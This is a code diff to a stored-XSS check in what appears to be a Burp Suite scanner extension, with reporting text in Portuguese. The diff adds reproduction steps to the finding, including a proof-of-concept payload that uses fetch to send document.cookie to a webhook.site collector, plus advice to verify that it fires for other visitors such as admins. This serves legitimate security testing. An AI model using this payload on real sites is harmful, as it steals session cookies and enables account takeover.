@@ -71,7 +71,12 @@ public class StoredXssCheck implements VulnCheck {
                                     "não depende de enganar a vítima a clicar em um link malicioso.",
                             "Payload enviado: " + payload + " | Confirmado em: " + ondeConfirmou,
                             "Sanitize/escape todo conteúdo gerado por usuário antes de armazenar OU antes de renderizar (idealmente " +
-                                    "as duas coisas), e implemente CSP como defesa em profundidade."));
+                                    "as duas coisas), e implemente CSP como defesa em profundidade.",
+                            "1) Reenvie o mesmo POST para '" + base + path + "' trocando o payload de teste por um PoC real, ex: " +
+                                    "<script>fetch('https://webhook.site/SEU-ID?c='+document.cookie)</script> no campo de comentário/mensagem. " +
+                                    "2) Acesse '" + ondeConfirmou + "' com outra sessão/navegador (simulando outro usuário/admin visitando a página) " +
+                                    "e confirme que o script roda automaticamente, sem precisar de interação da vítima. 3) Isso demonstra que " +
+                                    "o payload atinge QUALQUER visitante — inclusive administradores, o que pode levar a takeover de conta."));
                 }
             } catch (Exception e) {
                 api.logging().logToError("[Rx0] Erro no check de XSS armazenado (" + path + "): " + e.getMessage());
